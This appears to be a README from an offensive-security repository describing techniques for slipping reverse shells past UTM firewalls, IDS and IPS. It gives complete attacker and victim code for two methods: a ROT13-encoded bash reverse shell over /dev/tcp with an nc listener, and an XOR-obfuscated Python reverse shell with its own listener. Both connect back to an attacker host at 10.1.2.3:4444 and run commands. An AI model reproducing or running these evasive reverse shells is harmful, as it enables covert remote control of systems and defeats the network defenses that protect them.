# evasion
Techniques for evading firewalls and anti-malware detection.

Acronyms used:
* UTM - Unified Threat Management.  A class of nextgen firewalls with integrated security features.
* IDS - Intrusion Detection System.  A device that detects malicious network traffic.
* IPS - Intrusion Prevention System.  A device that detects and blocks malicious network traffic.

## ROT13 encoded reverse shell using bash TCP device

This technique is useful for getting a reverse shell through a UTM firewall, IDS or IPS.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />
[ linux command ]<br />
`IFS=''; (while read -r lin; do echo $lin | tr 'A-Za-z' 'N-ZA-Mn-za-m'; done) | nc -nlvp 4444 | tr 'A-Za-z' 'N-ZA-Mn-za-m'`<br />

( victim )<br />
[ linux command ]<br />
`exec 5<>/dev/tcp/10.1.2.3/4444; /bin/bash 2>&1 <(while read -r lin; do echo $(echo $lin | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m'); done <&5) | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m' >&5; exec 5<&-`<br />

## XOR obfuscated reverse shell using python

This technique is useful for getting a reverse shell through a UTM firewall, IDS or IPS.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />
[ python script ]<br />
```python
import socket
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(2)
print "Listening... "
(client, (ip, port)) = s.accept()
print " Received connection from : ", ip
while True:
  command = raw_input('~$ ')
  encode = bytearray(command)
  for i in range(len(encode)):
    encode[i] ^=0x5A
  client.send(encode)
  en_data=client.recv(2048)
  decode = bytearray(en_data)
  for i in range(len(decode)):
    decode[i] ^=0x5A
  print decode
client.close()
s.close()
```

( victim )<br />
[ python script ]<br />
`#!/usr/bin/python`<br />
`import socket,subprocess,sys`<br />
`RHOST = "10.1.2.3"`<br />
`RPORT = 4444`<br />
`s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`<br />
`s.connect((RHOST, RPORT))`<br />
`while True:`<br />
`  data = s.recv(1024)`<br />
`  en_data = bytearray(data)`<br />
`  for i in range(len(en_data)):`<br />
`    en_data[i] ^=0x5A`<br />
`  comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)`<br />
`  STDOUT, STDERR = comm.communicate()`<br />
`  en_STDOUT = bytearray(STDOUT)`<br />
`  for i in range(len(en_STDOUT)):`<br />
`    en_STDOUT[i] ^=0x5A`<br />
`  s.send(en_STDOUT)`<br />
`s.close()`<br />
